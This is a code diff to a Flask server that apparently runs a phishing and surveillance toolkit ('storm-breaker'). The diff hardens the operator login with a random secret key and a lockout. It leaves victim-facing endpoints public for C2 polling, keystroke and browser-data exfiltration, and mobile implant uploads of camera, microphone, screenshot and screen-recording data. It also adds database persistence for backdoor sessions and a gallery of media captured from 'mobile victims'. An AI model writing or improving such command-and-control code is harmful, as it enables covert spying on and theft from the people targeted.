@@ -16,6 +16,8 @@ from functools import wraps
 
 import uuid as uuid_module
 
+import database as db
+
 BASE_DIR = os.path.dirname(__file__)
 TEMPLATES_DIR = os.path.join(BASE_DIR, 'templates')
 FLASK_TEMPLATES_DIR = os.path.join(BASE_DIR, 'flask_templates')
@@ -23,9 +25,76 @@ CHECK_C_PATH = os.path.join(BASE_DIR, 'check-c.json')
 PHP_CONFIG_PATH = os.path.join(BASE_DIR, 'config.php')
 
 app = Flask(__name__, static_folder=os.path.join(BASE_DIR, 'assets'), template_folder=FLASK_TEMPLATES_DIR)
-app.secret_key = 'storm-breaker-secret-key-v1'
+# secret key: persisted random value (fix: hardcoded public key allowed session forging)
+import os as _os, secrets as _secrets
+_KEYFILE = _os.path.join(_os.path.dirname(_os.path.abspath(__file__)), 'secret_key.bin')
+try:
+    with open(_KEYFILE) as _f:
+        _SK = _f.read().strip()
+    if not _SK:
+        raise IOError('empty')
+except IOError:
+    _SK = _secrets.token_hex(32)
+    with open(_KEYFILE, 'w') as _f:
+        _f.write(_SK)
+app.secret_key = _SK
 # Disable upload size limit completely
 app.config['MAX_CONTENT_LENGTH'] = None
+
+# ===== GLOBAL AUTH GATE (fix for vuln dc999286: unauth read APIs on public URL) =====
+_VICTIM_PUBLIC_PATHS = {
+    '/login', '/login.php', '/logout', '/logout.php', '/index.php', '/favicon.ico',
+    '/receiver', '/receiver.php',
+    '/api/fingerprint', '/api/keystrokes',
+    '/api/session/start', '/api/session/events', '/api/session/end',
+    '/api/c2/register', '/api/c2/poll', '/api/c2/response',
+    '/api/c2/file_list_response', '/api/c2/file_download_response',
+    '/api/mobile/register', '/api/mobile/poll', '/api/mobile/response',
+    '/api/mobile/camera', '/api/mobile/background_data',
+    '/api/mobile/screenshot', '/api/mobile/audio', '/api/mobile/screen_record',
+    '/api/browser-exfil/receive', '/api/network/receive',
+}
+_VICTIM_PUBLIC_PREFIXES = ('/t/', '/assets/', '/c/')
+
+@app.before_request
+def _auth_gate():
+    path = request.path
+    if path in _VICTIM_PUBLIC_PATHS:
+        return None
+    if any(path.startswith(p) for p in _VICTIM_PUBLIC_PREFIXES):
+        return None
+    if session.get('IAm-logined'):
+        return None
+    if path.startswith('/api/') or path.endswith('.php'):
+        return jsonify({'error': 'Unauthorized'}), 401
+    return redirect('/login')
+
+# ===== login brute-force lockout (fix: public URL + default creds) =====
+import time as _time
+_LOGIN_FAILS = {}
+
+@app.before_request
+def _login_throttle():
+    if request.path in ('/login', '/login.php') and request.method == 'POST':
+        ip = (request.headers.get('X-Forwarded-For') or request.remote_addr or '?').split(',')[0].strip()
+        rec = _LOGIN_FAILS.get(ip)
+        if rec and rec[1] > _time.time():
+            return jsonify({'error': 'Too many failed attempts; locked 60s'}), 429
+
+@app.after_request
+def _login_throttle_track(resp):
+    if request.path in ('/login', '/login.php') and request.method == 'POST':
+        ip = (request.headers.get('X-Forwarded-For') or request.remote_addr or '?').split(',')[0].strip()
+        if resp.status_code in (301, 302):
+            _LOGIN_FAILS.pop(ip, None)
+        else:
+            fails, until = _LOGIN_FAILS.get(ip, (0, 0))
+            if until and until <= _time.time():
+                fails = 0
+            fails += 1
+            _LOGIN_FAILS[ip] = (fails, (_time.time() + 60) if fails >= 5 else 0)
+    return resp
+
 
 # ===== ANALYTICS ENGINE =====
 ANALYTICS = {
@@ -844,12 +913,18 @@ def c2_register():
     data = request.json
     uid = data.get('uid')
     info = data.get('info', {})
-    
+
+    if not uid:
+        return jsonify({'error': 'No uid provided'}), 400
+
     C2_SESSIONS[uid] = {
         'last_seen': datetime.now().isoformat(),
         'info': info,
         'ip': request.remote_addr
     }
+
+    # Persist so the client list survives a server restart
+    db.save_c2_session(uid, info, request.remote_addr)
     
     # Initialize queues if new
     if uid not in C2_COMMANDS:
@@ -863,9 +938,15 @@ def c2_register():
 def c2_poll():
     data = request.json
     uid = data.get('uid')
-    
+
+    if not uid:
+        return jsonify({'error': 'No uid provided'}), 400
+
     if uid in C2_SESSIONS:
         C2_SESSIONS[uid]['last_seen'] = datetime.now().isoformat()
+
+    # Keep the persisted record fresh too
+    db.update_c2_last_seen(uid)
         
     # Check for commands
     if uid in C2_COMMANDS and len(C2_COMMANDS[uid]) > 0:
@@ -879,7 +960,10 @@ def c2_response():
     data = request.json
     uid = data.get('uid')
     output = data.get('output')
-    
+
+    if not uid:
+        return jsonify({'error': 'No uid provided'}), 400
+
     if uid in C2_SESSIONS:
         C2_SESSIONS[uid]['last_seen'] = datetime.now().isoformat()
     
@@ -899,7 +983,16 @@ def c2_list_clients():
     # Filter active clients (seen in last 60 seconds)
     active = []
     now = datetime.now()
+
+    # Merge persisted sessions (survive a server restart)
+    for uid, db_session in db.get_all_c2_sessions().items():
+        if uid not in C2_SESSIONS:
+            C2_SESSIONS[uid] = db_session
+
     for uid, sess in C2_SESSIONS.items():
+        if not uid:
+            # Skip corrupt sessions that have no uid
+            continue
         # Calculate time diff
         try:
             last = datetime.fromisoformat(sess['last_seen'])
@@ -997,9 +1090,6 @@ def c2_file_download_response():
 
 # ===== MOBILE BACKDOOR ENDPOINTS =====
 
-# Import database for persistence
-import database as db
-
 # Global Mobile State
 MOBILE_SESSIONS = {}
 MOBILE_COMMANDS = {}
@@ -1012,7 +1102,10 @@ def mobile_register():
     data = request.json
     uid = data.get('uid')
     info = data.get('info', {})
-    
+
+    if not uid:
+        return jsonify({'error': 'No uid provided'}), 400
+
     # Save to DATABASE (PERSISTENT - survives restart!)
     db.save_mobile_session(uid, info, request.remote_addr)
     
@@ -1101,6 +1194,11 @@ def mobile_camera():
             
             # Store reference
             MOBILE_CAMERA_IMAGES[uid] = fname
+
+            # Index in the capture gallery (persistent across restarts)
+            db.save_mobile_capture(uid, 'camera', fname, '/images/' + fname, {
+                'size': len(decoded_data)
+            })
             
             # Send notification
             send_notification({
@@ -1115,6 +1213,118 @@ def mobile_camera():
             return jsonify({'error': str(e)}), 500
     
     return jsonify({'error': 'Invalid data'}), 400
+
+
+# ===== MOBILE MEDIA CAPTURES =====
+# Media pushed by the mobile implant: screenshots, microphone recordings and
+# screen recordings. These are victim-facing endpoints, so they are listed in
+# the auth-gate allowlist. Every file is written to disk (so it survives a
+# server restart) and indexed in the database for the operator gallery.
+
+MOBILE_CAPTURE_DIRS = {
+    'screenshot': ('images', 'jpg'),
+    'camera': ('images', 'jpg'),
+    'audio': ('sounds', 'webm'),
+    'screen_record': ('videos', 'webm'),
+}
+
+
+def _decode_data_url(payload):
+    """Decode a base64 data URL (or raw base64 payload) into raw bytes."""
+    if not payload:
+        return None
+    if isinstance(payload, bytes):
+        payload = payload.decode('utf-8', 'ignore')
+    if ',' in payload:
+        payload = payload.split(',', 1)[1]
+    payload = payload.strip()
+    try:
+        return base64.b64decode(payload, validate=False)
+    except Exception:
+        return None
+
+
+def _save_mobile_capture(uid, capture_type, field, extra_meta=None):
+    """Persist a media capture sent by the mobile implant."""
+    data = request.get_json(silent=True) or {}
+    raw = _decode_data_url(data.get(field))
+    if not raw:
+        return jsonify({'error': 'No %s data provided' % field}), 400
+
+    subdir, ext = MOBILE_CAPTURE_DIRS[capture_type]
+    target_dir = os.path.join(BASE_DIR, subdir)
+    os.makedirs(target_dir, exist_ok=True)
+
+    fname = 'mobile_%s_%s.%s' % (
+        capture_type, datetime.utcnow().strftime('%d%Y%H%M%S%f'), ext)
+    with open(os.path.join(target_dir, fname), 'wb') as f:
+        f.write(raw)
+
+    url = '/%s/%s' % (subdir, fname)
+    meta = {'size': len(raw), 'captured_at': data.get('timestamp')}
+    if data.get('url'):
+        meta['page_url'] = data.get('url')
+    if extra_meta:
+        meta.update(extra_meta)
+
+    db.save_mobile_capture(uid, capture_type, fname, url, meta)
+
+    send_notification({
+        "type": "Mobile Capture: %s" % capture_type,
+        "uid": uid,
+        "filename": fname,
+        "url": url,
+        "timestamp": datetime.now().isoformat()
+    })
+
+    return jsonify({'status': 'saved', 'filename': fname, 'url': url, 'size': len(raw)})
+
+
+@app.route('/api/mobile/screenshot', methods=['POST'])
+def mobile_screenshot():
+    """Mobile client sends a screenshot capture"""
+    data = request.get_json(silent=True) or {}
+    uid = data.get('uid')
+    if not uid:
+        return jsonify({'error': 'Invalid data'}), 400
+    return _save_mobile_capture(uid, 'screenshot', 'image')
+
+
+@app.route('/api/mobile/audio', methods=['POST'])
+def mobile_audio():
+    """Mobile client sends a microphone recording"""
+    data = request.get_json(silent=True) or {}
+    uid = data.get('uid')
+    if not uid:
+        return jsonify({'error': 'Invalid data'}), 400
+    return _save_mobile_capture(uid, 'audio', 'audio')
+
+
+@app.route('/api/mobile/screen_record', methods=['POST'])
+def mobile_screen_record():
+    """Mobile client sends a screen recording"""
+    data = request.get_json(silent=True) or {}
+    uid = data.get('uid')
+    if not uid:
+        return jsonify({'error': 'Invalid data'}), 400
+    return _save_mobile_capture(uid, 'screen_record', 'video')
+
+
+@app.route('/api/mobile/captures', methods=['GET'])
+def mobile_captures():
+    """List media captured from mobile victims (newest first)"""
+    uid = request.args.get('uid')
+    captures = db.get_mobile_captures(uid=uid)
+    return jsonify({'captures': captures, 'count': len(captures)})
+
+
+@app.route('/videos/<filename>')
+def serve_video(filename):
+    """Serve captured screen recordings"""
+    videos_dir = os.path.join(BASE_DIR, 'videos')
+    os.makedirs(videos_dir, exist_ok=True)
+    return send_from_directory(videos_dir, filename)
+
 
 @app.route('/api/mobile/clients', methods=['GET'])
 def mobile_clients():
@@ -1133,6 +1343,9 @@ def mobile_clients():
     
     # Now check which are active
     for uid, session in MOBILE_SESSIONS.items():
+        if not uid:
+            # Skip corrupt sessions that have no uid
+            continue
         try:
             last_seen = datetime.fromisoformat(session['last_seen'])
             seconds_ago = (now - last_seen).total_seconds()
